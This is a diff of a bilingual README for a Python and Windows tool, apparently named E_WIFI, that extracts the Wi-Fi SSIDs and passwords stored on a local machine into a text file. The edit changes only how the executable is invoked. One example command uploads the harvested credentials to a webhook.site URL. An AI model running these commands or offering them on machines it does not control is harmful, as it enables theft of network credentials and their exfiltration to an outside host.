@@ -35,7 +35,7 @@ Offline
 
 python3 E_WIFIoffline.py
 
-CMD or Powershell ./E_WIFIoffline.exe (You can also double click it)
+CMD or Powershell E_WIFIoffline.exe | ./E_WIFIoffline.exe (You can also double click it)
 
 Creates a txt with the WIFI's ssid and passwords stored in the local machine
 Crea un txt con los nombres y las contrasenas WIFI guardadas en la maquina local
@@ -47,7 +47,7 @@ Usages
 default usage
 python3 E_WIFI.py
 
-CMD or Powershell ./E_WIFI.exe
+CMD or Powershell E_WIFI.exe | ./E_WIFI.exe
 
 Creates a txt with the WIFI's ssid and passwords stored in the local machine
 Crea un txt con los nombres y las contrasenas WIFI guardadas en la maquina local
@@ -55,7 +55,7 @@ Crea un txt con los nombres y las contrasenas WIFI guardadas en la maquina local
 Another Example
 
 python3 E_WIFI.py -o -u https://webhook.site/yoururl 
-CMD or Powershell ./E_WIFI.exe -o -u https://webhook.site/yoururl
+CMD or Powershell E_WIFI.exe | ./E_WIFI.exe -o -u https://webhook.site/yoururl
 
 type --help for more detailed info
 
